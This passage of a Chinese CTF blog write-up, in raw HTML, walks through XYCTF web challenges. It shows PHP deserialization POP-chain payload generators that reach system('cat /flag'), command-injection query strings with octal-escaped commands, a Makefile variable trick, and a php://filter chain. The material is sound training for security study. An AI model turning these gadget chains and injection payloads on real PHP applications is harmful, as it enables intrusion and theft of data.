class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>本体只能用白名单上的进行绕过，有\有数字估计是八进制，空格用$&lt;进行绕过。</p><p>累了，上payload吧，利用了简要的拼接。</p><p><img src="/../images/xyctf/rce.png" alt="rce"></p><h2 id="ezpop"><a class="markdownIt-Anchor" href="#ezpop"></a> ezpop</h2><p>对于反序列化不好的我一点也不ez,先看源码分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 A &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 B &lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-variable">$d</span>=<span class="hljs-variable language_">$this</span>-&gt;d;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)(<span class="hljs-variable">$c</span>)(<span class="hljs-variable">$d</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you get 2 C &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xy&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;noooooob!!!&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p><p>CCC::destruct  —&gt; AAA::toString—&gt;BBB::get，这样的大体流程。下面我们上代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;echo system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> AAA;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> BBB;<br><span class="hljs-variable">$a</span>-&gt;c=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;s=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-string">&quot;eval&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p><code>$a</code>=new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用<code>$p = $this-&gt;a;</code></p><p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p><p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">c,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span></span></span></span>d已经赋值好了，还需要post传值<img src="/../images/xyctf/ezpop.png" alt="ezpop"></p><p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p><p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了。</p><h2 id="牢牢记住逝者为大"><a class="markdownIt-Anchor" href="#牢牢记住逝者为大"></a> 牢牢记住，逝者为大</h2><p><img src="/../images/xyctf/%E7%89%A2%E5%A4%A7.png" alt="牢大"></p><p>so,what can i say,manba out</p><p>这题还是有许多值得学习的知识点的，先简要分析一下。</p><p>cmd的长度不能大于13</p><p>内容禁用的挺多的，如上</p><p>大致思路是需要拼接最后得到的，因为下方有个eval函数。</p><p>既然都禁了那我尝试转义吧，转十六进制可能会出现f,会被禁用，那么我们就转八进制。</p><p><img src="/../images/xyctf/laoda1.png" alt="laoda1"></p><p>处于编码问题我们都是加一个\0,如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">\<span class="hljs-number">0143\0160</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0146\0154</span>\<span class="hljs-number">0141\0147</span>\<span class="hljs-number">0040\0057</span>\<span class="hljs-number">0166\0141</span>\<span class="hljs-number">0162\0057</span>\<span class="hljs-number">0167\0167</span>\<span class="hljs-number">0167\0057</span>\<span class="hljs-number">0150\0164</span>\<span class="hljs-number">0155\0154</span>\<span class="hljs-number">0057\0061</span>\<span class="hljs-number">0056\0164</span>\<span class="hljs-number">0170\0164</span>\<span class="hljs-number">0012</span>   ，最后的是换号符<br></code></pre></td></tr></table></figure><p>再看前面要过滤man和mamba out,前面可以考虑换行%0A,后面%23注释掉就行</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0A<span class="hljs-string">`$_GET[1]`</span>;%23&amp;<span class="hljs-number">1</span>=%24(echo -e <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>反引号用于执行，%24是$,echo -e 用于执行转义，加上面的放入下面的代码中就可以实行。最后再切换到1.txt,得到答案。</p><p><img src="/../images/xyctf/lao2.png" alt="lao2"></p><h2 id="以下为复现-εzмkε"><a class="markdownIt-Anchor" href="#以下为复现-εzмkε"></a> 以下为复现（  εZ?¿м@Kε¿?</h2><p><a href="https://blog.csdn.net/ZBraveHeart/article/details/123187908?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171412303116777224485918%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171412303116777224485918&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123187908-null-null.142%5Ev100%5Epc_search_result_base1&amp;utm_term=makefile&amp;spm=1018.2226.3001.4187">知识点</a>，写这题之前可以看看这篇的知识点，简要的了解一下。<img src="/../images/xyctf/%CE%B5Z%C2%BF%D0%BC@K%CE%B5%C2%BF.png" alt="εZ¿м@Kε¿"></p><p>尝试了第一种和第二种都不行，看了其他师傅的wp，考察的可能是真的是makefile的知识点，之前也没搜过这方面的内容，就小学一下吧。这里简单的说一下。</p><p><code>$</code>符号表示取变量的值，当变量名多于一个字符时，使用&quot;( )&quot;<br><code>$</code>符的其他用法</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$^</span> 表示所有的依赖文件<br><span class="hljs-variable">$@</span> 表示生成的目标文件<br><span class="hljs-variable">$&lt;</span> 代表第一个依赖文件<br></code></pre></td></tr></table></figure><p>尝试输入内容。<img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F%EF%BC%9F.png" alt="？？？"></p><p>得知当前的依赖文件里面就是flag.</p><p><code>$</code>&lt;,显示的是/flag，那么&lt;<code>$</code>&lt;也就是&lt;/flag,由上面得知多于一个字符需要使用括号，那么就先构造**<code>$</code>(&lt;<code>$</code>&lt;)**,我的理解是取进去flag文件</p><p>里面的值，先输入看看，这是下面的回显。</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">Nothing</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;FLAG&#x27;</span>.<br></code></pre></td></tr></table></figure><p>也就是说**<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>&lt;</mo></mrow><annotation encoding="application/x-tex">(&lt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mrel">&lt;</span></span></span></span>&lt;)**,可能代表的就是flag这个内容，读取我们需要再加个$</p><p><img src="/../images/xyctf/%EF%BC%9F%EF%BC%9F.png" alt="？？"></p><h2 id="连连看到底是连连什么看"><a class="markdownIt-Anchor" href="#连连看到底是连连什么看"></a> 连连看到底是连连什么看</h2><p>下载文件。先靠着打断点过了一次关发现并不能得到flag,看到文件里面有what’s_this.php，打开网页看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$p</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="hljs-variable">$p</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;waf!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$p</span>/resource=/etc/passwd&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$payload</span>)===<span class="hljs-string">&quot;XYCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>看了wp,可以看一下这位师傅讲的原理，<a href="https://blog.csdn.net/m0_73512445/article/details/134627841">filterchain</a>，简单的来说就是就是base64只能识别[A-Za-z0-9+/=]，这些其他的不可见字符会自动忽略。原理大致就是最后只要解密成为XYCTF就可以了，这里师傅推荐的脚本，<a href="https://github.com/synacktiv/php_filter_chain_generator">脚本</a>，直接clone下来就可以用了构造一下</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B.png" alt="连连看"></p><p>然后再脚本跑一下，<img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B1.png" alt="连连看1"></p><p>最后末尾要改一下，根据题目的设定以及要多解几次base64，多修改几次也就得到flag了。</p><p><img src="/../images/xyctf/%E8%BF%9E%E8%BF%9E%E7%9C%8B2.png" alt="连连看2"></p><h2 id="ezserialize"><a class="markdownIt-Anchor" href="#ezserialize"></a> ezSerialize</h2><p>哎，看到序列化反序列化就不想写，太菜了，先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token === <span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$pop</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    <span class="hljs-variable">$pop</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$pop</span>-&gt;<span class="hljs-title function_ invoke__">login</span>()) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这题第一层其实是原题，是ctfshow上面的，<a href="https://blog.csdn.net/Kracxi/article/details/122887126">链接</a>，由于md5(mt_rand())在变化而且很难爆破，只要让token=password就行我们写个代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;password=&amp;<span class="hljs-variable">$a</span>-&gt;token;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/serialize.png" alt="serialize"></p><p>进入第二层，贴个源码（真的烦啊.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mack-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;luo;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$wang1</span>,<span class="hljs-variable">$wang2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$this</span>-&gt;lao-&gt;chen) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable language_">$this</span>-&gt;lao-&gt;chen;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;num!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>静下来分析以下其实第二层也不算太难的还是从后往前推，关键应该在echo $flag2这里</p><p>调用一个不存在的函数可以调用__call()，也就是$this-&gt;mack-&gt;nonExistentMethod();</p><p>__invoke()把对象当成函数就可以调用，return $function()可以解决这个问题。</p><p>__get调用不存在的属性，return is_null($this-&gt;lao-&gt;chen) ? “” : $this-&gt;lao-&gt;chen;可以解决。</p><p>__toString有echo就行，调用__unserialize($data) ,里面的，值得注意的是我看了其他师傅的wp，好像因为php版本问题，这里不能用，下面的wakeup也是可以调用的，分析完我罗列一下。</p><p>E::__wakeup-&gt;D::__tostring-&gt;B::__get-&gt;A::__invoke-&gt;C::__call;</p><p>我们尝试写一下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>; <br>       &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span 